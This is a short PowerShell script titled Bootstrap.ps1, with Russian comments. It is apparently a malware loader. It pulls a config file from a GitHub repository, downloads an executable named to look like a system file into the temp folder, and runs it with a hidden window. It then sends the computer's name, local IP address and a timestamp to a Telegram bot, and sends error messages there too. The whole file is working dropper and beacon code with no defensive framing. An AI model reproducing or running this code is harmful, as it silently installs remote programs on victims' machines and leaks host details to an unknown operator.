
# =========================================
# Bootstrap.ps1
# - тянет cfg.json
# - скачивает exe
# - запускает exe
# - отправляет отчёт в Telegram
# =========================================

try {
    # --- GitHub требует TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = 3072

    # --- URLs
    $CFG_URL = 'https://github.com/sapog228ru-ship-it/test/raw/refs/heads/main/cfg.json'
    $TMP_EXE = Join-Path $env:TEMP 'syscfg.exe'

    # --- Получаем конфиг
    $cfg = Invoke-RestMethod -Uri $CFG_URL -UseBasicParsing

    if (-not $cfg.exe) {
        throw 'cfg.json: exe url missing'
    }

    # --- Скачиваем EXE
    Invoke-WebRequest -Uri $cfg.exe -OutFile $TMP_EXE -UseBasicParsing

    if (-not (Test-Path $TMP_EXE)) {
        throw 'EXE download failed'
    }

    # --- Запуск EXE
    Start-Process -FilePath $TMP_EXE -WindowStyle Hidden

    # --- Получаем IPv4 (без 127 и 169.254)
    $ip = [System.Net.Dns]::GetHostAddresses(
        [System.Net.Dns]::GetHostName()
    ) | Where-Object {
        $_.AddressFamily -eq 'InterNetwork' -and
        $_.IPAddressToString -notlike '169.254*' -and
        $_.IPAddressToString -notlike '127.*'
    } | Select-Object -First 1 | ForEach-Object {
        $_.IPAddressToString
    }

    if (-not $ip) { $ip = 'no-ip' }

    # --- Telegram OK
    Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$($cfg.tg.token)/sendMessage" `
        -Method Post `
        -Body @{
            chat_id = $cfg.tg.chat
            text    = "OK $env:COMPUTERNAME $ip $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
        }

}
catch {
    # --- Telegram ERROR (если возможно)
    try {
        Invoke-RestMethod `
            -Uri "https://api.telegram.org/bot$($cfg.tg.token)/sendMessage" `
            -Method Post `
            -Body @{
                chat_id = $cfg.tg.chat
                text    = "ERROR $env:COMPUTERNAME $($_.Exception.Message)"
            }
    } catch {}
}
